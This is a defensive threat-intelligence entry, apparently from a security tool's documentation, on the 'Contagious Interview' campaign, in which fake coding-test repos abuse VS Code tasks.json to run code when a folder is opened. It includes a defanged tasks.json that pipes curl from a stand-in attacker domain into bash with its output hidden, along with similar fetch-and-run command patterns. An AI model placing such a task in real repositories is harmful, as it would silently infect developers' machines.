# Contagious Interview (VS Code tasks.json)

**Type:** Developer environment · **When:** Nov 2023 to 2026 · **Status:** confirmed

## What happened

A North Korea-linked campaign (MITRE G1052) targets job seekers. The victim gets a "coding test" repo, and opening it infects their machine. Early versions (2023-2024) hid malware in npm packages such as passports-js, bcrypts-js and blockscan-api, delivering BeaverTail and the Python backdoor InvisibleFerret. By 2025-2026 the main method was a VS Code `tasks.json` that runs a command when the folder opens.

A related 2026 tool, StoatWaffle (NTT Security), is a Node.js stealer that uses blockchain-themed decoy repos and runs once the developer opens the project and grants trust.

## How it got in

1. A fake recruiter sends a repo on GitHub, GitLab or Bitbucket. It looks like a full app.
2. The repo has `.vscode/tasks.json` with `runOn: "folderOpen"`.
3. The task runs a hidden shell command per OS (`curl | bash`, `wget -qO- | sh`, `curl | cmd`).
4. Settings hide it: `reveal: "never"`, `echo: false`, `close: true`.
5. The victim clicks "trust" in VS Code. The task runs.
6. Once trusted, VS Code does not ask again, so later pulls can add new tasks silently.
7. Later variants hide the dropper in a file that looks like a spell-check dictionary. Payloads were staged on Vercel.

## Why it was hard to spot

- Workspace Trust is the only gate, and people click it.
- Per-OS commands hide from scanners that read only the top-level command.
- `tasks.json` allows comments and trailing commas, which break strict JSON parsers.
- The payload may live only on an interview-specific branch.

## Signs to look for

- In one change: `.vscode/tasks.json` with `runOn: folderOpen` or `reveal: never`, or commands with a pipe to a shell, `curl`/`wget`, Base64 or a URL; `.vscode/settings.json` keys pointing at programs; `launch.json` `preLaunchTask`.
- Across changes over time: a trusted repo later gets a folder-open task; a task points at a harmless-looking file added separately.
- Other surfaces listed in the notes without a confirmed incident: `.devcontainer/devcontainer.json` (`postCreateCommand`, `initializeCommand`), `.idea/runConfigurations/*.xml`, `.envrc` (direnv), `.pre-commit-config.yaml`.

## Defanged example

```json
{ "label": "<innocent name>", "type": "shell",
  "osx":   { "command": "curl <attacker-domain>/settings/mac?flag=<id> | bash" },
  "presentation": { "reveal": "never", "echo": false, "close": true },
  "runOptions": { "runOn": "folderOpen" } }
```

## How Pushguard catches it

- Diff rules: `editor-autorun-changed` flags changes to `.vscode/tasks.json`, `settings.json`, `launch.json`, `.idea/**/*.xml` and `.devcontainer/**`. `shell-pipe-to-interpreter` may match the command.
- This works when such a file is pushed to a monitored org repo (a fork or vendored code). An interview repo a developer clones from outside is not seen by Pushguard.
- Endpoint detection (GitLab: background `spawn-helper` children running `curl | bash`) is outside Pushguard.

## References

- [GitLab Security Labs, May 2026](https://about.gitlab.com/blog/how-to-detect-and-prevent-contagious-interview-ide-attacks/)
- [The Hacker News, Jan 2026](https://thehackernews.com/2026/01/north-korea-linked-hackers-target.html)
- [OpenSourceMalware](https://opensourcemalware.com/blog/contagious-interview-vscode)
- [NHIMG / Abstract Security](https://nhimg.org/articles/vs-code-tasks-files-let-attackers-trigger-developer-infection-chains/)
- [CSO Online, StoatWaffle](https://www.csoonline.com/article/4149274/new-stoatwaffle-malware-auto%E2%80%91executes-attacks-on-developers.html)
- [VS Code Workspace Trust docs](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust)
- [Datadog, Tenacious Pungsan](https://securitylabs.datadoghq.com/articles/tenacious-pungsan-dprk-threat-actor-contagious-interview/)
- [The Hacker News, Oct 2024](https://thehackernews.com/2024/10/beavertail-malware-resurfaces-in.html)
- [Atlassian](https://www.atlassian.com/blog/how-we-build/disrupting-contagious-interview?nb=1)

Not verified: original Unit 42 and Microsoft reports were not read; no authoritative victim count for 2025-2026.
